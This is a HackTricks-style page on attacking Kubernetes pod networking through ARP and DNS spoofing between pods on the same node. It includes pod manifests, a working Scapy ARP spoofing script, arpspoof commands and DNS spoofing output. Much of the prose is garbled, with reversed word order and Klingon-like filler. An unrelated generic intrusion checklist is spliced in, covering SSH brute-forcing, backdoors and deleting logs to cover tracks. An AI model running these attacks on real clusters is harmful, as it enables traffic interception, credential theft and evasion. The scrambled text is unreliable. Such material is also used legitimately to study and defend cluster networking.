# Kubernetes Network Attacks

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <strong>tlhInganpu'wI'pu' (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a></summary>

**HackTricks** **Qapla'** **Support**:

* **tlhInganpu'wI'** **tlhInganpu'wI'** **advertise** **company** **'ej** **HackTricks** **PDF** **download** **want** **you** **If** **[** **SUBSCRIPTION PLANS** **](https://github.com/sponsors/carlospolop)** **Check**!
* **[** **official PEASS & HackTricks swag** **](https://peass.creator-spring.com)** **Get**
* **[** **The PEASS Family** **](https://opensea.io/collection/the-peass-family)** **Discover**, **[** **NFTs** **](https://opensea.io/collection/the-peass-family)** **exclusive** **collection** **our**
* **üí¨** **[** **Discord group** **](https://discord.gg/hRep4RUj7f)** **Join** **or** **[** **telegram group** **](https://t.me/peass)** **or** **me** **follow** **üê¶** **Twitter** **on** **üê¶** **[** **@carlospolopm** **](https://twitter.com/carlospolopm)**.
* **[** **HackTricks** **](https://github.com/carlospolop/hacktricks)** **and** **[** **HackTricks Cloud** **](https://github.com/carlospolop/hacktricks-cloud)** **github** **repos** **the** **to** **PRs** **submitting** **by** **tricks** **hacking** **your** **Share**.

</details>

## Introduction

**Kubernetes** **Daq** **containers** **all** **between** **connections** **establishment** **permits** **behavior** **default** **a** **that** **observed**. **distinctions** **namespace** **the** **of **node** **same** **the** **on** **residing** **containers** **all** **between** **connections** **the** **of** **establishment** **permits** **behavior** **default** **a** **that** **observed** **is**. **vulnerabilities** **to** **system** **the** **exposes** **potentially** **configuration** **This** **layer** **2** **Layer** **down** **extends** **connectivity** **Such**. **containers** **other** **against** **attack** **spoofing** **ARP** **an** **execute** **to** **container** **malicious** **a** **for** **possibility** **the** **up** **opens** **Specifically**. **containers** **other** **for** **intended** **traffic** **network** **the** **modify** **or** **intercept** **deceitfully** **can** **container** **malicious** **the** **During** **node** **the** **on** **situated** **containers**. 

**ARP** **messages** **Protocol** **Resolution** **Address** **falsified** **sending** **attacker** **the** **involve** **attacks** **spoofing** **ARP**. **network** **area** **local** **over** **messages** **ARP** **falsified** **sending** **attacker** **The**. **network** **the** **server** **computer** **legitimate** **a** **address** **IP** **the** **with** **address** **MAC** **attacker's** **the** **of** **linking** **the** **results** **This**. **in-transit** **data** **stop** **even** **or** **modify** **intercept** **can** **attacker** **the** **successful** **Post**. **model** **OSI** **the** **of** **2** **Layer** **on** **executed** **is** **attack** **the** **why** **layer** **this** **at** **Kubernetes** **in** **connectivity** **default** **the** **why** **concerns** **security** **raises** **layer** **this**.

**machines** **be** **to** **going** **are** **4** **scenario** **the** **In**:

* **namespace** **default** **in** **machine** **Victim** **ubuntu-victim**: **Victim** **kube-system** **in** **machine** **ubuntu-attack**: **Malicious** **container**
* **namespace** **default** **in** **mysql**: **namespace** **default** **in** **machine** **ubuntu-pe**: **machine** **Privileged**
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Basic Kubernetes Networking

### ARP

Generally speaking, **pod-to-pod networking inside the node** is available via a **bridge** that connects all pods. This bridge is called ‚Äú**cbr0**‚Äù. (Some network plugins will install their own bridge.) The **cbr0 can also handle ARP** (Address Resolution Protocol) resolution. When an incoming packet arrives at cbr0, it can resolve the destination MAC address using ARP.

This fact implies that, by default, **every pod running in the same node** is going to be able to **communicate** with any other pod in the same node (independently of the namespace) at ethernet level (layer 2).

{% hint style="warning" %}
Therefore, it's possible to perform A**RP Spoofing attacks between pods in the same node.**
{% endhint %}

### DNS

In kubernetes environments you will usually find 1 (or more) **DNS services running** usually in the kube-system namespace:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
In the previous info you can see something interesting, the **IP of the service** is **10.96.0.10** but the **IP of the pod** running the service is **172.17.0.2.**

If you check the DNS address inside any pod you will find something like this:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
However, the pod **doesn't know** how to get to that **address** because the **pod range** in this case is 172.17.0.10/26.

Therefore, the pod will send the **DNS requests to the address 10.96.0.10** which will be **translated** by the cbr0 **to** **172.17.0.2**.

{% hint style="warning" %}
This means that a **DNS request** of a pod is **always** going to go the **bridge** to **translate** the **service IP to the endpoint IP**, even if the DNS server is in the same subnetwork as the pod.

Knowing this, and knowing **ARP attacks are possible**, a **pod** in a node is going to be able to **intercept the traffic** between **each pod** in the **subnetwork** and the **bridge** and **modify** the **DNS responses** from the DNS server (**DNS Spoofing**).

Moreover, if the **DNS server** is in the **same node as the attacker**, the attacker can **intercept all the DNS request** of any pod in the cluster (between the DNS server and the bridge) and modify the responses.
{% endhint %}

## ARP Spoofing in pods in the same Node

Our goal is to **steal at least the communication from the ubuntu-victim to the mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

{% code-tabs %}
{% code-tabs-item title="Klingon" %}
### ARPSpoof
{% endcode-tabs-item %}
{% endcode-tabs %}
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

As it was already mentioned, if you **compromise a pod in the same node of the DNS server pod**, you can **MitM** with **ARPSpoofing** the **bridge and the DNS** pod and **modify all the DNS responses**.

You have a really nice **tool** and **tutorial** to test this in [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

In our scenario, **download** the **tool** in the attacker pod and create a \*\*file named `hosts` \*\* with the **domains** you want to **spoof** like:
```
cat hosts
google.com. 1.1.1.1
```
**Attack Execution**

1. **Step 1**: Identify the IP address of the `ubuntu-victim` machine.

2. **Step 2**: Use a network scanning tool, such as Nmap, to scan the `ubuntu-victim` machine for open ports and services.

   ```bash
   nmap <ubuntu-victim-IP>
   ```

3. **Step 3**: Identify any vulnerable services or open ports that can be exploited.

4. **Step 4**: Exploit the identified vulnerabilities using appropriate tools or techniques.

   - For example, if an open SSH port is found, attempt to brute-force the SSH credentials using tools like Hydra or Medusa.

   - If a vulnerable web application is discovered, exploit it using techniques like SQL injection or cross-site scripting (XSS).

5. **Step 5**: Gain unauthorized access to the `ubuntu-victim` machine by successfully exploiting the identified vulnerabilities.

6. **Step 6**: Once access is gained, escalate privileges to gain administrative or root access.

   - Exploit known privilege escalation vulnerabilities or misconfigurations.

   - Use tools like `sudo` or `su` to escalate privileges.

7. **Step 7**: Perform any desired actions on the compromised machine, such as stealing sensitive data, modifying configurations, or installing backdoors.

8. **Step 8**: Cover tracks and remove any evidence of the attack.

   - Delete logs and any other traces of the attack.

   - Use tools like `shred` to securely delete files.

9. **Step 9**: Exit the compromised machine and ensure that all connections are terminated.

   - Use the appropriate command to exit the shell or session.

   - Verify that no active connections remain.

10. **Step 10**: Document the attack process, including the vulnerabilities exploited and the actions performed.

   - Take screenshots or record the steps for future reference.

   - Include any findings or recommendations for improving the security of the `ubuntu-victim` machine.

**Note**: Ensure that you have proper authorization and legal permission before performing any attack.
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
vaj vItlhutlh DNS spoofing script, vaj **DNS response** **ghap** **modify** **not** **work**, **response** **src IP** **malicious** **pod** **IP address** **won't** **accepted**.\
**DNS** **victim** **DNS request** **src IP** **DNS packet** **generate** **need** (172.16.0.2, 10.96.0.10 **DNS** **server** IP **DNS** **K8s** **service** IP, **introduction** **more** **about**).
{% endhint %}

## Capturing Traffic

[**Mizu**](https://github.com/up9inc/mizu) **tool** **simple-yet-powerful API traffic viewer for Kubernetes** **enable** **view all API communication** **microservices** **help** **debug** **troubleshoot regressions**.\
**install** **agents** **selected pods** **gather** **traffic information** **show** **web server**. **However**, **high K8s permissions** **need** (and **not** **stealthy**).

## References

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
